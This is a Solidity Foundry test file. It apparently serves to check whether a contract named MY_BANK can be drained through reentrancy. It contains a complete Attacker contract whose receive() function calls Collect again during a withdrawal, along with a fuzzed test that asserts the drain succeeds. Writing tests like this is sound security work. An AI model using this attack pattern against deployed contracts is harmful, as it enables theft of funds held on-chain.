
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal % 2 == 0);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // deposit from attacker so that:
        // - balance >= MinSum (1 ether)
        // - balance >= _am (we'll withdraw attackVal/2)
        uint256 depositAmount = attackVal;
        vm.prank(address(_attacker));
        _contractUnderTest.Put{value: depositAmount}(0);

        // make sure unlockTime condition is satisfied
        vm.warp(block.timestamp + 1);

        uint256 withdrawAmount = attackVal / 2;
        _attacker.setupAttack{value: withdrawAmount}(withdrawAmount);

        _attacker.attack(withdrawAmount);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawAmount;

    constructor(address victimAddress) {
        victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedWithdrawAmount = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedWithdrawAmount = val;

        victim.Collect(val);

        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedWithdrawAmount);
        }
    }
}
